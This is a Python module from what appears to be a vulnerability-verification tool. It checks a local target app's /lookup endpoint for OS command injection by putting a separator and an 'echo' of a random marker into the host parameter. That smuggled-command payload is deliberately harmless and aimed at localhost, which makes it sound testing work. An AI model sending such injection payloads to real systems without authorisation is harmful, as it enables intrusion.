# sentinel/attacks/cmdi.py
"""
F-03: Command Injection on the /lookup endpoint.

Strategy: rather than dumping /etc/passwd on every single test run
(noisy, and technically riskier output to be passing around), inject
an `echo` of a random marker string. If that marker shows up in the
response, arbitrary command execution is proven, cleanly and
repeatably, without needing to rely on a specific file existing at a
specific path.
"""
import requests
import secrets
import platform

FINDING_ID = "F-03"
TITLE = "OS Command Injection in Diagnostic Lookup Endpoint"
SEVERITY = "Critical"
AFFECTED_COMPONENT = "target_app/routes/utils.py :: GET /lookup"


def attack(base_url: str = "http://localhost:8001") -> dict:
    result = {
        "finding_id": FINDING_ID,
        "title": TITLE,
        "severity": SEVERITY,
        "affected_component": AFFECTED_COMPONENT,
        "vulnerable": False,
        "evidence": None,
        "error": None,
    }

    marker = f"SENTINEL_CMDI_{secrets.token_hex(4)}"
    separator = "&" if platform.system() == "Windows" else ";"
    payload = f"127.0.0.1{separator} echo {marker}"

    try:
        r = requests.get(f"{base_url}/lookup", params={"host": payload}, timeout=5)
    except requests.RequestException as e:
        result["error"] = f"Could not reach target: {e}"
        return result

    if r.status_code != 200:
        return result

    output = r.text
    result["vulnerable"] = marker in output

    if result["vulnerable"]:
        result["evidence"] = {
            "payload": payload,
            "marker_injected": marker,
            "raw_output": output,
        }

    return result


if __name__ == "__main__":
    import json
    print(json.dumps(attack(), indent=2))